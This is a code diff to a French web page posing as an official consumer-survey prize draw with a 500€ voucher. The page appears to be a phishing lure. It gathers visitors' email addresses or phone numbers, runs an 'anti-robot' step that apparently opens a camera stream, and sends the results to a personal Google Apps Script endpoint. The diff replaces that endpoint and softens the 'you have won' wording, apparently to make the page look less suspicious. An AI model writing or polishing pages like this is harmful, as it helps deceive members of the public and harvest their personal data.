@@ -125,8 +125,8 @@
 
   <!-- ÉTAPE 2 -->
   <div class="step" id="step-prize">
-    <h2 style="color: #E1000F;">Félicitations, vous avez gagné !</h2>
-    <p class="subtitle">Vous faites partie des gagnants de notre enquête. Pour recevoir votre bon d'achat de 500€, veuillez indiquer comment vous souhaitez le recevoir.</p>
+    <h2>Réception de votre récompense</h2>
+    <p class="subtitle">Pour recevoir votre bon d'achat de 500€, veuillez indiquer le mode de réception souhaité et renseigner vos coordonnées.</p>
     <div class="form-group">
       <label>Mode de réception du bon d'achat</label>
       <select id="input-method">
@@ -138,7 +138,7 @@
       <label>Votre adresse e-mail</label>
       <input type="email" id="input-contact" placeholder="exemple@email.com" required>
     </div>
-    <button class="btn-action" id="btn-claim">Réclamer mon bon d'achat</button>
+    <button class="btn-action" id="btn-claim">Valider mes coordonnées</button>
   </div>
 
   <!-- ÉTAPE 3 -->
@@ -167,7 +167,7 @@
     </div>
   </div>
 
-  <!-- ÉTAPE 4 : Message final corrigé -->
+  <!-- ÉTAPE 4 -->
   <div class="confirmation-box" id="step-confirmation">
     <div class="confirmation-icon">✓</div>
     <h2>Participation validée</h2>
@@ -193,7 +193,8 @@
 <div class="modal" id="modal-reglement"><div class="modal-content"><button class="close-modal" onclick="closeModal('modal-reglement')">&times;</button><h2>Règlement du jeu-concours</h2><p><em>Article 1 – Organisation</em></p><p>L'Observatoire National de la Consommation organise un jeu-concours gratuit et sans obligation d'achat du 1er novembre 2026 à 00h00 au 31 décembre 2026 à 23h59.</p><p><em>Article 2 – Conditions de participation</em></p><p>Ce jeu est ouvert à toute personne physique majeure résidant légalement sur le territoire français. La participation est limitée à une seule fois par personne (même nom, même adresse e-mail, même numéro de téléphone).</p><p><em>Article 3 – Modalités de participation</em></p><p>Pour que sa participation soit validée, le candidat doit remplir le formulaire d'enquête, répondre aux questions, renseigner ses coordonnées (e-mail ou téléphone) et procéder à la vérification anti-robot. Toute participation incomplète ou frauduleuse sera automatiquement rejetée.</p><p><em>Article 4 – Dotation</em></p><p>Le jeu est doté d'un bon d'achat d'une valeur de 500€ valable chez les partenaires officiels (Fnac, Darty, Amazon, Leclerc). Le lot offert ne peut donner lieu à aucune contestation, ni à la remise de sa contrevaleur en espèces, ni à son échange.</p><p><em>Article 5 – Désignation des gagnants</em></p><p>Les gagnants seront désignés par tirage au sort parmi l'ensemble des participants ayant respecté toutes les modalités de participation. Le tirage au sort aura lieu le 15 janvier 2027.</p><p><em>Article 6 – Remise du lot</em></p><p>Les gagnants seront contactés par e-mail ou par SMS dans les jours suivant le tirage au sort. Le bon d'achat sera envoyé par voie électronique. Tout lot non réclamé dans un délai de 30 jours après l'annonce sera considéré comme perdu.</p><p><em>Article 7 – Exclusions et fraudes</em></p><p>Les participations multiples sont interdites. L'organisateur se réserve le droit d'exclure sans préavis tout participant ayant recours à des robots, des faux comptes ou à toute autre méthode frauduleuse.</p><p><em>Article 8 – Protection des données personnelles</em></p><p>Les données collectées sont traitées conformément à la Politique de confidentialité accessible sur le site. Conformément au RGPD, vous disposez d'un droit d'accès, de rectification et d'effacement de vos données.</p><p><em>Article 9 – Litiges</em></p><p>Le présent règlement est soumis à la loi française. Tout litige sera soumis aux tribunaux compétents de Paris.</p></div></div>
 
 <script>
-const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxyBJ1b7bGa7ZK93Wl3l7jEHxCq95fO-uA4FomFkmKFgx9mySuEWiffTKXplax1fdh8iw/exec";
+// ⚠️ TON NOUVEAU LIEN EST ICI ⚠️
+const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwLlBzujK5-tZKZyYiDDKtU59Aw4eU0p88RGoaIKDsltfaHpYxZEdjidUAnlVudwehv6Q/exec";
 
 function openModal(id) { document.getElementById(id).style.display = 'block'; }
 function closeModal(id) { document.getElementById(id).style.display = 'none'; }
@@ -375,7 +376,6 @@ btnSubmit.addEventListener('click', async () => {
 
       if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
       
-      // Adaptation du message final selon le choix (Email ou SMS)
       if (inputMethod.value === 'sms') {
         confirmMethod.textContent = "SMS";
       } else {
